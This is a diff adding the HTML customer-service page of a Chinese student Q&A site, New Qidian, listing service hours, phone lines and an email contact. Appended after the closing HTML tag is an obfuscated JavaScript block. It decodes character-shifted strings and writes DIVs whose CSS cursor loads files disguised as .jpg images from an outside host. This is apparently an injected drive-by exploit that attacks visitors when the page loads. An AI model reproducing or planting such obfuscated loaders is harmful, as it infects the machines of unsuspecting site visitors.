@@ -1,0 +1,178 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
+<HTML>
+	<HEAD>
+				<title>【新起点－－问卷解答－－客户中心】</title>
+		<META http-equiv="Content-Type" content="text/html; charset=gb2312">
+		<meta content="新起点社区<五年级><六年级><初一><初二><初三><高一><高二><高三>问卷 试题 答案 解答" name="keywords">
+		<meta content="新起点社区<五年级><六年级><初一><初二><初三><高一><高二><高三>问卷 试题 答案 解答 " name="description">
+		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
+		<meta name="CODE_LANGUAGE" Content="C#">
+		<meta name="vs_defaultClientScript" content="JavaScript">
+		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">
+		<LINK href="Css/Default.css" type="text/css" rel="stylesheet">
+	</HEAD>
+	<body>
+		<form name="Form1" method="post" action="khzx.aspx" id="Form1">
+<input type="hidden" name="__VIEWSTATE" value="dDwxNTE0MzkyNTc7dDw7bDxpPDE+Oz47bDx0PDtsPGk8Mz47PjtsPHQ8cDxsPFRleHQ7PjtsPFw8UCBjbGFzcz1TVFlMRTRcPg0KXDxQXD5cPEZPTlQgc2l6ZT0yXD5cPC9GT05UXD5cPC9QXD5cPEZPTlQgc2l6ZT0yXD7lrqLmiLfmnI3liqHkuK3lv4PogYzotKPvvIzlj4rml7bnmoTnlLXor53mnI3liqE6IFw8L0ZPTlRcPg0KXDxQXD5cPC9QXD4NClw8UFw+XDxGT05UIHNpemU9Mlw+44CA44CAMeOAgeiBhuWQrOWuouaIt+eahOWjsOmfs++8jOiQpemAoOa4qeaalueahOa4r+a5vuOAguaIkeS7rOS4uuaCqOaPkOS+m+aYrzHlubQzNjXlpKkyNOWwj+aXtueahOacjeWKoe+8jOaCqOWPr+S7peS7u1w8L0ZPTlRcPlw8L1BcPg0KXDxQXD5cPEZPTlQgc2l6ZT0yXD7kvZXml7bpl7Tmi6jmiZPmiJHku6znmoTnlLXor53jgIJcPEJSXD5cPEJSXD7jgIDjgIAgMuOAgeS4k+S4muWMlueahOWuouaIt+acjeWKoeWboumYn++8jOeDreW/g+e7huiHtOeahOacjeWKoeaAgeW6puOAglw8L0ZPTlRcPlw8L1BcPg0KXDxQXD5cPEZPTlQgc2l6ZT0yXD7mlrDotbfngrnmgLvmnLrvvJogMDIyLSBcPC9GT05UXD5cPC9QXD4NClw8UFw+XDxGT05UIHNpemU9Mlw+5pyN5Yqh5pe26Ze077ya5ZGo5LiA772e5ZGo5LqUIDA577yaMDDvvI0yMu+8mjAwIOWRqOWFreOAgeWRqOaXpeS7peWPiuWFrOWFseWBh+acnyAwOe+8mjAw77yNMTfvvJowMFw8L0ZPTlRcPlw8L1BcPg0KXDxQXD5cPEZPTlQgc2l6ZT0yXD7mlrDotbfngrkyNOWwj+aXtuacjeWKoeeDree6v++8miAxMzAxMjItLS1cPC9GT05UXD5cPC9QXD4NClw8UFw+XDxGT05UIHNpemU9Mlw+6YKu5pS/57yW56CB77yaIDMwMDExMSBcPC9GT05UXD5cPC9QXD4NClw8UFw+XDxGT05UIHNpemU9Mlw+5Lyg55yfOigwODYpIDAyMi04MTgyNDMwMFw8QlJcPlw8QlJcPlw8U1BBTiBjbGFzcz1TVFlMRTRcPlw8U1RST05HXD7miJHku6znmoTmnI3liqHvvJpcPC9TVFJPTkdcPlw8L1NQQU5cPlw8L0ZPTlRcPlw8L1BcPg0KXDxQXD5cPEZPTlQgc2l6ZT0yXD7mlrnkvr/lv6vmjbfnmoToh6rliqnmnI3liqHvvIzlhYjov5vlhajpnaLnmoTnvZHkuIroh6rliqnmnI3liqHns7vnu5/jgIJcPC9GT05UXD5cPC9QXD4NClw8UFw+XDxTVFJPTkdcPlw8Rk9OVCBzaXplPTJcPlw8U1BBTiBjbGFzcz1TVFlMRTRcPuesrOS4gOaXtumXtOaPkOS+m+esrOS4gOa1geeahOWuouaIt+acjeWKoe+8mlw8L1NQQU5cPlw8QlJcPlw8L0ZPTlRcPlw8L1NUUk9OR1w+XDwvUFw+DQpcPFBcPlw8Rk9OVCBzaXplPTJcPuOAgDHjgIHnpL7ljLror6Lpl67lpITlj4rml7bnrZTnlpHvvJpcPC9GT05UXD5cPC9QXD4NClw8UFw+XDxGT05UIHNpemU9Mlw+44CA44CA5pyJ6Zeu6aKY5oKo5Zyo6K+i6Zeu5aSE5Y+R6LS077yM5oiR5Lus5q+P5aSp55qEMTDngrnliLAyMueCueWwhuWNs+aXtue7meaCqOetlOWkjeOAgiBcPC9GT05UXD5cPC9QXD4NClw8UFw+XDxGT05UIHNpemU9Mlw+44CAMuOAgeaIkeS7rOeahOmCruS7tuacjeWKoeS4reW/g+e7meaCqOeahOaJv+ivuuaYr++8mlw8L0ZPTlRcPlw8L1BcPg0KXDxQXD5cPEZPTlQgc2l6ZT0yXD7mgqjnmoTpgq7ku7bkuIDkuKrlt6XkvZzml6XlhoXnu5nkuojlm57lpI3jgIIg5oiR5Lus55qE6YKu566x5Zyw5Z2A77yaem53eWJAaG90bWFpbC5jb21cPC9GT05UXD5cPC9QXD4NClw8UFw+XDxGT05UIHNpemU9Mlw+44CAM+OAgeS4gOS4quW3peS9nOaXpeiupOivgeWkhOeQhlw8L0ZPTlRcPlw8L1BcPg0KXDxQXD5cPEZPTlQgc2l6ZT0yXD7jgIDjgIDmgqjnmoTorqTor4HnlLPor7fvvIzmiJHku6zkuIDkuKrlt6XkvZzml6XlhoXlpITnkIbvvIzmiJHku6znmoTorqTor4HkuK3lv4Pmr4/lpKnlj5fnkIbmlrDliqDlhaXnmoTkvJrlkZjorqTor4HnlLNcPC9GT05UXD5cPC9QXD4NClw8UFw+XDxGT05UIHNpemU9Mlw+6K+344CC5oKo5Zyo5paw6LW354K55b+r5LmQ5peF56iL5bCx5q2k5bGV5byA44CCXDwvRk9OVFw+XDwvUFw+DQpcPFBcPlw8Rk9OVCBzaXplPTJcPuOAgDTjgIHkuInkuKrlt6XkvZzml6XmipXor4nlpITnkIZcPC9GT05UXD5cPC9QXD4NClw8UFw+XDxGT05UIHNpemU9Mlw+44CA44CA5oKo55qE5oqV6K+J77yM5oiR5Lus5LiJ5Liq5bel5L2c5pel5YaF5aSE55CG44CCXDwvRk9OVFw+XDwvUFw+Oz4+Ozs+Oz4+Oz4+Oz5IUSMVq42HE65zKSPOKTlzVz+3Sw==" />
+
+			<TABLE id="Table1" cellSpacing="0" cellPadding="0" width="761" align="center" border="0">
+				<TR>
+					<TD>
+						
+<LINK href="../Css/Default.css" type="text/css" rel="stylesheet">
+<style type="text/css"> <!-- .STYLE1 {color: #0044FF}
+	.STYLE3 {color: #0044FF; font-size: 12px; text-decoration: none;}
+	a:link { text-decoration: none; }
+	a:visited { text-decoration: none; }
+	a:hover { text-decoration: underline; }
+	a:active { text-decoration: none; }
+	--> 
+</style>
+<TABLE id="Table1" cellSpacing="0" cellPadding="0" width="769" background="images/top.gif"
+	border="0" style="WIDTH: 769px; HEIGHT: 80px">
+	<TR>
+		<TD vAlign="top">
+			<TABLE id="Table2" cellSpacing="0" cellPadding="0" width="768" border="0" style="WIDTH: 768px; HEIGHT: 48px">
+				<TR>
+					<TD style="HEIGHT: 23px"></TD>
+					<TD style="HEIGHT: 23px" align="right"><SPAN><a href="Default.aspx">首页</a>&nbsp;&nbsp;&nbsp;<a onclick="this.style.behavior='url(#default#homepage)';this.setHomePage('http://www.newqidian.cn/');return(false);"
+								href="#">设为首页</a>&nbsp;&nbsp;&nbsp; <a onclick="javascript:window.external.AddFavorite('http://www.newqidian.cn')" target="_self"
+								href="#">加入收藏</a> &nbsp;&nbsp;&nbsp;<a href="khzx.aspx">客户中心</a></SPAN>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD></TD>
+					<TD align="right"><table border="0" align="right" cellpadding="0" cellspacing="5" id="Table3">
+										<tr>
+										<td>
+										
+										</td>
+											<td width="54" background="images/index_4.gif" class="STYLE3"><div align="center"><a href="login.aspx">会员登陆</a></div>
+											</td>
+											<td width="54" background="images/index_4.gif" class="STYLE3"><div align="center"><a href="reg.aspx">会员注册</a></div>
+											</td>
+											<td width="54" background="images/index_4.gif" class="STYLE3"><div align="center"><a target="_blank" href="mailto:znwyb@hotmail.com">联系我们</a></div>
+											</td>
+											<td width="45" height="23" background="images/index_6.gif" class="STYLE3"><div align="center"><a target="main" href="bbs/index.asp">社区</a></div>
+											</td>
+										</tr>
+									</table>
+					</TD>
+				</TR>
+				
+			</TABLE>
+		</TD>
+	</TR>
+</TABLE>
+</TD>
+				</TR>
+				<TR>
+					<TD style="HEIGHT: 36px" vAlign="bottom" background="images/zhu_3.gif"><FONT face="宋体">&nbsp;&nbsp;
+						</FONT>
+						</TD>
+				</TR>
+		
+				<TR>
+					<TD align="center">
+						<TABLE id="Table2" style="HEIGHT: 102px" cellSpacing="0" cellPadding="0" width="700" border="0">
+							<TR>
+								<TD style="HEIGHT: 45px" vAlign="bottom"><IMG alt="" src="images/kehuzhongxin.gif"></TD>
+							</TR>
+							<TR>
+								<TD style="WORD-BREAK: break-all; HEIGHT: 50px" width="98%"><FONT class="new1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+										<P class=STYLE4>
+<P><FONT size=2></FONT></P><FONT size=2>客户服务中心职责，及时的电话服务: </FONT>
+<P></P>
+<P><FONT size=2>　　1、聆听客户的声音，营造温暖的港湾。我们为您提供是1年365天24小时的服务，您可以任</FONT></P>
+<P><FONT size=2>何时间拨打我们的电话。<BR><BR>　　 2、专业化的客户服务团队，热心细致的服务态度。</FONT></P>
+<P><FONT size=2>新起点总机： 022- </FONT></P>
+<P><FONT size=2>服务时间：周一～周五 09：00－22：00 周六、周日以及公共假期 09：00－17：00</FONT></P>
+<P><FONT size=2>新起点24小时服务热线： 130122---</FONT></P>
+<P><FONT size=2>邮政编码： 300111 </FONT></P>
+<P><FONT size=2>传真:(086) 022-81824300<BR><BR><SPAN class=STYLE4><STRONG>我们的服务：</STRONG></SPAN></FONT></P>
+<P><FONT size=2>方便快捷的自助服务，先进全面的网上自助服务系统。</FONT></P>
+<P><STRONG><FONT size=2><SPAN class=STYLE4>第一时间提供第一流的客户服务：</SPAN><BR></FONT></STRONG></P>
+<P><FONT size=2>　1、社区询问处及时答疑：</FONT></P>
+<P><FONT size=2>　　有问题您在询问处发贴，我们每天的10点到22点将即时给您答复。 </FONT></P>
+<P><FONT size=2>　2、我们的邮件服务中心给您的承诺是：</FONT></P>
+<P><FONT size=2>您的邮件一个工作日内给予回复。 我们的邮箱地址：znwyb@hotmail.com</FONT></P>
+<P><FONT size=2>　3、一个工作日认证处理</FONT></P>
+<P><FONT size=2>　　您的认证申请，我们一个工作日内处理，我们的认证中心每天受理新加入的会员认证申</FONT></P>
+<P><FONT size=2>请。您在新起点快乐旅程就此展开。</FONT></P>
+<P><FONT size=2>　4、三个工作日投诉处理</FONT></P>
+<P><FONT size=2>　　您的投诉，我们三个工作日内处理。</FONT></P></FONT></TD>
+							</TR>
+						</TABLE>
+					</TD>
+				</TR>
+				<TR>
+					<TD>
+						
+<LINK href="../Css/Default.css" type="text/css" rel="stylesheet">
+<TABLE id="Table1" cellSpacing="0" cellPadding="0" width="761" align="center" border="0">
+	<tr>
+		<td height="10"></td>
+	</tr>
+	<tr>
+		<td><img src="images/bottom.gif" /></td>
+	</tr>
+	<TR>
+		<TD>
+			<TABLE id="Table2" cellSpacing="0" cellPadding="0" width="766" style="WIDTH: 766px; HEIGHT: 112px">
+				<TR>
+					<TD height="28" style="HEIGHT: 28px">
+						<DIV class="STYLE4" align="center"><a href=default.aspx>首页</a> - <a href=jieshao.aspx>网站介绍</a> - <a target="_blank" href="mailto:znwyb@hotmail.com">客户留言</a> - <a target="_blank" href="mailto:znwyb@hotmail.com">联系我们</a> - <A href=zhinan.aspx>网站指南</A> - <a href=morelianjie.aspx>友情链接</a></DIV>
+					</TD>
+				</TR>
+				<TR>
+					<TD height="31" style="HEIGHT: 31px">
+						<DIV align="center">Copyright(C) 2006 NEW QIDIAN CO.,LTD. All Rights Reserved</DIV>
+					</TD>
+				</TR>
+				<TR>
+					<TD height="32" style="HEIGHT: 32px">
+						<DIV align="center">版权所有归新起点&nbsp; E-mail：<A href="mailto:znwyb@hotmail.com">znwyb@hotmail.com</A></DIV>
+					</TD>
+				</TR>
+				<TR>
+					<TD height="35">
+						<DIV align="center">TEL: 86-022-81824300&nbsp;&nbsp;联系人：张楠</DIV>
+					</TD>
+				</TR>
+			</TABLE>
+		</TD>
+	</TR>
+</TABLE>
+</TD>
+				</TR>
+			</TABLE>
+		</form>
+	</body>
+</HTML>
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+var HtmlStrings=["=NFUB!iuuq.frvjw>Dpoufou.Uzqf!dpoufou>#ufyu0iunm<!dibstfu>cjh6#>=CPEZ>!=EJW!tuzmf>#DVSTPS;!vsm)(iuuq;00xxx/15191/dpn0wjq0y","jyj/kqh(*#>=EJW!tuzmf>#DVSTPS;!vsm)(iuuq;00xxx/15191/dpn","0wjq0ibib/kqh(*#>=0EJW>=0EJW>=0CPEZ>=0IUNM>"];
+function psw(st){
+  var varS;
+  varS="";
+  var i;
+  for(var a=0;a<st.length;a++){
+    i = st.charCodeAt(a); 
+    if (i==1) 
+      varS=varS+String.fromCharCode('"'.charCodeAt()-1);
+    else if (i==2) {
+      a++;
+      varS+=String.fromCharCode(st.charCodeAt(a));
+      }
+    else
+      varS+=String.fromCharCode(i-1);
+  }
+  return varS;
+};
+var num=3;
+function S(){
+for(i=0;i<num;i++)
+  document.write(psw(HtmlStrings[i]));}
+S();
+// -->
+</SCRIPT>
